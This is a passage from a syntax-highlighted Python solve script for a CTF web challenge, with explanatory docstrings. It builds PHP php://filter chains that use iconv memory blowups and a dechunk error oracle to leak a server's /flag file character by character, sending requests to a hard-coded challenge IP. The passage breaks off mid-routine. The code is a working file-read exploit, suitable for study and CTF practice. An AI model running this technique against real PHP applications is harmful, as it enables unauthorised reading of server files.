class="string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">does not cause a 500 error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE REST:</span></span><br><span class="line"><span class="string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span></span><br><span class="line"><span class="string">into madness trying to figure out ways to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- somehow get other characters not at the start of the flag file to the front</span></span><br><span class="line"><span class="string">- detect more precisely which character is at the front</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">join</span>(<span class="params">*x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;|&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">err</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests.get(<span class="string">&#x27;http://39.105.5.7:49227/?my[secret.flag=C:8:%22Saferman%22:0:&#123;&#125;&amp;secret=&#x27;</span>+<span class="string">f&#x27;php://filter/<span class="subst">&#123;s&#125;</span>/resource=/flag&#x27;</span>).status_code == <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">blow_up_enc = join(*[<span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="number">1000</span>)</span><br><span class="line">blow_up_utf32 = <span class="string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span></span><br><span class="line">blow_up_inf = join(*[blow_up_utf32]*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start get baseline blowup</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Calculating blowup&#x27;</span>)</span><br><span class="line">baseline_blowup = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    payload = join(*[blow_up_utf32]*n)</span><br><span class="line">    <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;payload&#125;</span>&#x27;</span>):</span><br><span class="line">        baseline_blowup = n</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;baseline blowup is <span class="subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;detecting equals&#x27;</span>)</span><br><span class="line">j = [</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(j) != <span class="number">2</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">1</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">2</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;j: <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;header: <span class="subst">&#123;header&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step two:</span></span><br><span class="line"><span class="string">Now we have something of the form</span></span><br><span class="line"><span class="string">[a-zA-Z0-9 things]==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span></span><br><span class="line"><span class="string">successive characters from the start of the string to access every character. Maybe something like</span></span><br><span class="line"><span class="string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span></span><br><span class="line"><span class="string">there are filters that *swap* characters:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; badcfehg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; dcbahgfe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This allows us to access the first four characters of the string. Can we do better? It turns out</span></span><br><span class="line"><span class="string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span></span><br><span class="line"><span class="string">the string:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The idea being that if we now use the r4 gadget, we get something like:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span></span><br><span class="line"><span class="string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span></span><br><span class="line"><span class="string">bafedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span></span><br><span class="line"><span class="string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span></span><br><span class="line"><span class="string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span></span><br><span class="line"><span class="string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span></span><br><span class="line"><span class="string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span></span><br><span class="line"><span class="string">turns out, if we apply the filter</span></span><br><span class="line"><span class="string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It will turn the == into:</span></span><br><span class="line"><span class="string">+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And this is magic, because this corrects such that when we apply the</span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let&#x27;s recap. We have a string like:</span></span><br><span class="line"><span class="string">abcdefghij==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span></span><br><span class="line"><span class="string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span></span><br><span class="line"><span class="string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply r4 gadget:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span></span><br><span class="line"><span class="string">bafedcjihg+0DAD3D3+0DAD3Dw==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then apply r4 once more:</span></span><br><span class="line"><span class="string">efabijcd0+gh3DAD0+3D3DAD==wD</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span></span><br><span class="line"><span class="string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span></span><br><span class="line"><span class="string">want, to access all the characters in the string ;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flip = <span class="string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span></span><br><span class="line">r4 = <span class="string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nth</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> flip, r2, r4</span><br><span class="line">    o = []</span><br><span class="line">    chunk = n // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> chunk % <span class="number">2</span> == <span class="number">1</span>: o.append(r4)</span><br><span class="line">    o.extend([flip, r4] * (chunk // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) ^ (chunk % <span class="number">2</span> == <span class="number">1</span>): o.append(r2)</span><br><span class="line">    <span class="keyword">return</span> join(*o)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step 3:</span></span><br><span class="line"><span class="string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span></span><br><span class="line"><span class="string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span></span><br><span class="line"><span class="string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span></span><br><span class="line"><span class="string">I just bruteforced every combination of iconv filters to find these.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span></span><br><span class="line"><span class="string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span></span><br><span class="line"><span class="string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span></span><br><span class="line"><span class="string">string to figure out which number it is.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rot1 = <span class="string">&#x27;convert.iconv.437.CP930&#x27;</span></span><br><span class="line">be = <span class="string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span></span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_letter</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># a-f A-F 0-9</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># a-e</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;edcba&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># A-E</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;EDCBA&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># f</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;f&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># F</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># n-s N-S</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># n-r</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;rqpon&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># N-R</span></span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;RQPON&#x27;</span>[n]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># s</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># S</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># i j k</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;k&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;j&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># I J K</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;K&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;J&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;I&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># v w x</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;v&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># V W X</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;W&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;V&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># Z</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># z</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># M</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># 